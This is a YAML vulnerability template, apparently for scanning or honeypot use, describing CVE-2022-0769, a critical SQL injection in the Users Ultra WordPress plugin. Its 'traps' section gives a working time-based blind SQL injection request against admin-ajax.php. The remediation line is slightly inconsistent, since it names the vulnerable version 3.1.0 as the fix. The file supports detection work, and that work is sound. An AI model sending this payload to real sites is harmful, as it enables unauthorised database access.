id: CVE-2022-0769
info:
  name: Users Ultra <= 3.1.0 - SQL Injection
  author: theamanrawat
  description: 'The Users Ultra WordPress plugin through 3.1.0 fails to properly sanitize
    and escape the data_target parameter before it is being interpolated in an SQL
    statement and then executed via the rating_vote AJAX action (available to both
    unauthenticated and authenticated users), leading to an SQL Injection.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized accessand data
    leakage.

    '
  remediation: 'Update to Users Ultra version 3.1.0 or later to mitigate this vulnerability.

    '
  reference:
  - https://wpscan.com/vulnerability/05eab45d-ebe9-440f-b9c3-73ec40ef1141
  - https://wordpress.org/plugins/users-ultra/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0769
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0769
    cwe-id: CWE-89
    epss-score: 0.02977
    epss-percentile: 0.90654
    cpe: cpe:2.3:a:usersultra:users_ultra:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: usersultra
    product: users_ultra
    framework: wordpress
  tags: cve,cve2022,wp,users-ultra,wpscan,sqli,wordpress,wp-plugin,usersultra
traps:
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: action=rating_vote&data_id=1&data_target=vote_score+%3d+1+AND+(SELECT+3+FROM+(SELECT(SLEEP(6)))gwe)--+
  response:
    status_code: 200
    headers: {}
    body: You have to be logged in to leave your rate
